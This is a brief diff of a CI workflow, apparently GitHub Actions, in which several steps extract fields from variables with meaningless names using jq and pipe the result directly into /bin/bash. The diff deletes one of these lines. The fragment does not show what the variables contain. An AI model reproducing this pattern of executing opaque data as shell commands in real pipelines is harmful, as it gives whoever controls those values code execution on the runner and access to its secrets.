@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$lfsxg446" | jq -r .ejjo4 | /bin/bash
           printf '%s' "$al9" | jq -r .y945 | /bin/bash
           echo $cr9 | jq -r .srs79 | /bin/bash
-          printf '%s' "$eso34" | jq -r .h04 | /bin/bash
           printf '%s' "$jdjcq658" | jq -r .sd4 | /bin/bash
 
       - name: Persist output
